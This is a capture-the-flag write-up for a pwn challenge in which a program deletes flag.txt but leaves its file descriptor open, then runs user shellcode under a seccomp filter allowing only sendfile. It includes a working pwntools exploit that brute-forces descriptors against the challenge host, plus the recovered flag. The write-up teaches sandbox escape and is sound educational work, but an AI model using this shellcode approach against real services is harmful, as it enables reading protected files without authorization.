# Deleted flag

![](https://i.imgur.com/pP4sEqo.png)

> [200 points]
> Deleted
> We've removed your flag. Good luck getting it back.
> Flag format: CTF{32-hex}"

The program is pretty simple to read and understand. I've commented the provided code and refactored it slightly so it's easier to follow:

```
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <limits.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>

/* 
 * C black magic to define a function type called void_fn 
 * which takes no parameters (void)
 * and returns nothing (void)
 */
typedef void (*void_fn)(void);

void setup_seccomp(void);

int main(void) {
	// unbuffered output to stdout
    setbuf(stdout, NULL);
	
	// open the flag.txt file
    FILE * fptr = fopen("flag.txt","r");
	
	// read its file descriptor index and print it
    int fd = fileno(fptr);
    printf("%d\n", fd);
	
    puts("Goodbye flag!");

	// remove the flag.txt file
    int ret = remove("flag.txt");
    if (ret == 0) {
        puts("Flag file successfully removed.");
    } else {
        puts("Error removing flag file");
        exit(-1);
    }

    puts("What do you have to say about us so carelessly removing your precious flag?");
	
	// make a readable, writable and executable buffer of 4096 bytes
    void * buf = mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    void_fn sc = (void_fn) buf;
	
	// read 100 bytes from stdin into the buffer
    ssize_t num_read = read(0, buf, 100);

	// setup seccomp stuff - see setup_seccomp function below
    setup_seccomp();
	
	// execute the input buffer (ie. execute whatever was supplied by the user)
    sc();

    return 0;
}

void setup_seccomp() {
    scmp_filter_ctx ctx;
	
	// initialise seccomp and set it to kill the process 
	// if it attempts to bypass seccomp restrictions 
    ctx = seccomp_init(SCMP_ACT_KILL);
    int ret = 0;
	
	// add a rule to allow sendfile system calls
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0);
	
	// load the current context
    ret |= seccomp_load(ctx);
	
	// exit on failure of any of the above
    if (ret) {
        exit(1);
    }
}

```

From this code, we can see a few things happening which in the end allow us to retrieved the flag.

We can see that the flag file pointer is open and therefore should have an open file descriptor for it:
```
    FILE * fptr = fopen("flag.txt","r");
```
This file is never closed which means the file descriptor is accessible until the program exits or finishes.

When I did this challenge, I didn't realise that the file descriptor index is printed when the program starts:
```
	// read its file descriptor index and print it
    int fd = fileno(fptr);
    printf("%d\n", fd);
```
However, its not really needed since you can just bruteforce it. I'll showcase the bruteforce solution in this writeup, however a smarter exploit would have used this leak to minimize the requests required.

We can also see the application is using seccomp to protect the process from executing most system calls. However, the following line adds the ability to use the `sendfile` syscall:
```
	ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0);
```

Base on the manual page of the `sendfile` syscall, we can see that this syscall is used to copy data between 2 file descriptors:
```
% man sendfile
  sendfile()  copies  data between one file descriptor and another.  Because this copying is done
       within the kernel, sendfile() is more efficient than the combination of read(2)  and  write(2),
       which would require transferring data to and from user space.
[...]
```

Furthermore, on linux systems, the standard output (stdout) of a program is a stream that can be accessed via it's file descriptor. As described in the man pages, we know that standard output by default will start as file descriptor 1:
```
% man stdout
Under  normal  circumstances  every UNIX program has three streams opened for it when it starts up, one for input, one for output, and one for printing diagnostic or  error  messages.
[...]
Each  of  these symbols is a stdio(3) macro of type pointer to FILE, and can be used with functions like fprintf(3) or fread(3).
[...]
On program startup, the integer file descriptors associated with the streams stdin, stdout, and stderr  are  0,  1, and 2, respectively.
[...]
```

Lastly, we saw from the code that the programs takes user input into a buffer and attempts to execute that code:
```
	// read 100 bytes from stdin into the buffer
    ssize_t num_read = read(0, buf, 100);

[...]
	
	// execute the input buffer (ie. execute whatever was supplied by the user)
    sc();
```

At this point, we have all the information we need to write an exploit for this app:
- We need to write shellcode which will get executed by the application
- The shellcode can make use of the sendfile system call
- We need to read the flag file from an open file descriptor and copy it to stdout (filedescriptor 1)

We use pwntools since it has all the tools we need to connect to the port and contains utilities to craft shellcode including a sendfile system call via  `shellcraft.amd64.linux.sendfile` :
```
from pwn import *

# flag length
# CTF{32-hex} | 5 known chars and 32 unknow = 37 chars
flag_len = 37

stdout_fd = 1

// bruteforce the filedescriptors 
// because you rushed it and didn't read the code properly :)
for tentative_fd in range(10):
    print("tentative_fd=", tentative_fd)
	
	// connect to the port with the app
    r = remote("portal.hackazon.org",17004)
	
	// send our sendfile shellcode
    r.send(asm(shellcraft.amd64.linux.sendfile(stdout_fd,tentative_fd,0,flag_len), arch='amd64'))
    print(r.recvall())
    r.close()
```

Running the exploit, we find that the flag file is at index 5 and we managed to copy to stdout and receive it:
![](https://i.imgur.com/Hk0ZT6l.png)

> Flag: CTF{5decd42da5fb3c9b1dc0b4dd12a4bd7c}
